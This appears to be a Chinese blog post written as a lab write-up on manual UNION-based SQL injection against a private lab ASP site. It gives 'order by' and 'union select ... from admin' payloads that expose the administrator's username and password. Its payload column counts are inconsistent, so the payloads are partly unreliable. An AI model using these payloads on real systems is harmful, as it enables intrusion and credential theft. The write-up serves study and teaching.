---
layout: post
title: "SQL注入原理-手工联合查询注入技术"
description: "SQL注入原理-手工联合查询注入技术"
tag: web 安全
---

<style>
.margin-left{
	margin-left:40px
}
.divmargin{
margin-left:60px
}
</style>

<br />

---

<br />

## **实验目的:**

##### &nbsp;&nbsp;&nbsp;1.理解联合查询的原理

##### &nbsp;&nbsp;&nbsp;2.学习联合查询的过程

<br />

## **实验原理:**

##### &nbsp;&nbsp;&nbsp; 首先，在链接后面添加语句 <code>order by 11 (数字任意)</code>，根据页面返回结果，来判断站点中的字段数目。
##### &nbsp;&nbsp;&nbsp; 然后，在链接后面添加语句

##### &nbsp;&nbsp;&nbsp;  <code>union select 1,2,3,4,5,6,7,8,9,10,11 from admin (表名)</code> 进行联合查询，来暴露可查询的字段编号。
##### &nbsp;&nbsp;&nbsp; 最后，根据上一步得到的字段编号，添加语句

##### &nbsp;&nbsp;&nbsp;  <code>union select 1,admin,password,4,5,6,78,9,10,11 from admin</code> 直接暴露管理员用户名和密码。

<br />

## **实验步骤:**

#### **1.检测字段长度**

<br />

<p class="margin-left">
<b>●</b>目标站点: <code>http://192.168.1.3:8008</code> 选择链接 <code>http://192.168.1.3:8008/onews.asp?id=45</code> 
&nbsp;&nbsp;&nbsp;
在后面添加语句<code>order by 12</code> 页面报错
</p>

<img src="/files/SQL injection principle - manually union query injection technique/1.png" width="300px" height="120px">

<br />

<p class="margin-left">
<b>○</b>添加语句 <code>order by 11</code> 页面显示正常，所以此站字段长度为11
</p>

<img src="/files/SQL injection principle - manually union query injection technique/2.png" width="300px" height="120px">

<br />

#### **2.暴管理员用户、密码**

<br />

<div class="divmargin">
<b>●</b>在链接后添加语句  
<br>
<code>union select 1,2,3,4,5,6,7,8,9,10,11 from admin</code>
<br />
页面显示数字2和3，如下图
</div>

<img src="/files/SQL injection principle - manually union query injection technique/3.png" width="300px" height="120px">

<br />

<div class="divmargin">
<b>○</b>在链接后添加语句
<br />
<code>union select 1,admin,password,4,5,6,7,8,9,10,11 from admin</code>
<br />
即可暴出管理员用户和密码
</div>

<img src="/files/SQL injection principle - manually union query injection technique/4.png" width="300px" height="120px">

<br />

## **实验总结:**

这次实验学习了联合查询注入的基本操作，但是对于其原理确实理解不了;

尽快看看数据库原理，弄懂SQL语句的含义。